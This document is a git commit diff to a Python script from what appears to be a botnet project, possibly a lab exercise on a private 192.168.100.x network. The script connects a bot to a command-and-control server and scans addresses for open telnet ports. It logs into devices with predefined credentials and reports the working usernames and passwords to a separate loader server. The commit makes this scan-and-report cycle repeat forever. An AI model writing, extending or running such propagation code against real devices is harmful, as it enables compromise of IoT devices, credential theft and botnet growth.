fb2a413eae10e8a0ead1d6db53fe7505ec0b83b0
Elena Mihailescu <elenamihailescu22@gmail.com>
2022-03-31 15:22:58 +0300

    [Bot] Run attack in a loop
    Signed-off-by: Elena Mihailescu <elenamihailescu22@gmail.com>

--- bot1_example.py
+++ bot1_example.py
@@ -17,18 +17,19 @@ bot1 = bot.bot("bot1")
 # Start bot and connect to the C&C server
 bot1.start_bot(cc_ip='192.168.100.11', heart_beat=5)
 
-for index in range(6):
-    devices = []
-    # Scan network for vulnerable devices
-    devices.append(bot1.scanner_init("192.168.100."+str(3+index), [23]))
-    devices = [device for device in devices if device is not None]
-    print(devices)
-    if devices:
-        # Try to login to device with telnet ports opened
-        # with predefined user and password
-        device, auth_info = bot1.telnet_login(devices)
-        # Report user and password to loader server
-        print(device)
-        if device != None:
-            bot1.report_working(loader_ip = '192.168.100.12', device=device, auth_info=auth_info)
+while (1):
+    for index in range(6):
+        devices = []
+        # Scan network for vulnerable devices
+        devices.append(bot1.scanner_init("192.168.100."+str(3+index), [23]))
+        devices = [device for device in devices if device is not None]
+        print(devices)
+        if devices:
+            # Try to login to device with telnet ports opened
+            # with predefined user and password
+            device, auth_info = bot1.telnet_login(devices)
+            # Report user and password to loader server
+            print(device)
+            if device != None:
+                bot1.report_working(loader_ip = '192.168.100.12', device=device, auth_info=auth_info)
 
